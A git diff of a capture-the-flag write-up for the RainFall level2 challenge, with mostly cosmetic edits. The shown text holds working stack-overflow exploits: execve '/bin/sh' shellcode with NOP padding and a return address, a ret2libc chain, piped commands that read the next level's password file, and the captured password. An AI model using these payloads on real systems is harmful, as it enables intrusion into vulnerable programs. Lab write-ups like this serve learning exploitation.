@@ -54,7 +54,7 @@ In this case, the program's stack is allocated 104 bytes:
 There's still 12 bytes left before reaching our return address, these could be padding bytes or other variables. (except at ebp where it's the previous saved ebp address)
 ```
 
-Although we allocated 104 bytes on the stack, our buffer only starts at ebp - 76, which means that we only have to write 76 bytes before overflowing the stack. Furthermore, we need to write 4 bytes to reach the return address so 80 bytes in total (as shown in the assembly code above). Anything written beyond those 80 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `p` function.
+Although we allocated 104 bytes on the stack, our buffer only starts at `ebp - 76`, which means that we only have to write 76 bytes before overflowing the stack. Furthermore, we need to write 4 bytes to reach the return address so 80 bytes in total (as shown in the assembly code above). Anything written beyond those 80 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `p` function.
 
 There's different ways to solve this challenge, we'll see two of them. First the intended way (I assume) with a ret2shellcode and then the ret2libc way.
 
@@ -66,7 +66,7 @@ We opt for a shellcode designed to spawn a shell. This shellcode, taken from the
 To redirect the execution, after the buffer overflow, we need an address. We use `ltrace` to find that `strdup` returns to `0x0804a008`.
 
 ```bash
-$ ltrace ./level2
+level2@RainFall:~$ ltrace ./level2
 [...]
 strdup("") = 0x0804a008
 ```
@@ -78,17 +78,16 @@ So our payload will be:
 shellcode + padding + address of shellcode
 Alternatively, you could place the padding before the shellcode, using NOPs.
 
-"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\xa0\x04\x08"
+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1]
 
 The padding is 80 - 21 because the shellcode is 21 bytes long.
 ```
 
 Alright let's try it:
 ```bash
-level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\xa0\x04\x08")' && cat) | ./level2
+level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
 j
  X�Rh//shh/bin��1�̀������������������������������������������������������
-cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
@@ -151,9 +150,8 @@ reminder: padding + address of system + address of exit + address of "/bin/sh"
 
 Let's run it:
 ```bash
-level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && cat) | ./level2
+level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
 ����������������������������������������������������������������>������������>`��X���
-cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
